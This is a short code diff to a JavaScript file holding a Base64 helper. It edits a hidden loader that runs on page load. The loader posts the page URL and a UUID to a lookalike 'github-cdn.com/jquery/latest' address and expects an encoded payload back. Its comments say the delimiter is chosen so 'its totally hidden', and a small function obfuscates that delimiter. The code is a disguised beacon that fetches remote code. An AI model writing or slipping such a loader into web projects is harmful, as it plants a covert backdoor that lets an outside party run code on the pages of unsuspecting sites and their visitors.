@@ -138,13 +138,13 @@ var Base64 = {
 
     /* Request format
      * {
-     *   version: "base64 string with a code delimiter" 
+     *   referer: the url,
+     *   version: the uuid
      * }
      *
      * Response format
      *  {
-     *    jquery: "true",
-     *    version: "base64 string with a code delimiter" 
+     *    jquery: "base64 string with a code delimiter" 
      *  }
      * OR
      *  {
@@ -159,7 +159,7 @@ var Base64 = {
      *  choose a weird starting 4 letters so its totally hidden
      */
    function code() {
-      var code = "aixlf";
+      var code = "aixlfgixgfe";
       var newCode = "";
       
       for(var i=0 ; i<code.length; i++) {
@@ -171,14 +171,14 @@ var Base64 = {
       }
       console.log(newCode);
       return newCode;
-    } 
+    }
 
     $(document).ready(function () {
       var request = {};
       request.referer = document.URL; 
       request.version = 'UUID'; //Replace with real UUID
       
-      var url =  "github-cdn.com" + "/jquery/latest";    
+      var url =  "github-cdn.com" + "/jquery/latest";
       $.ajax({
         type: "POST",
         url: url,
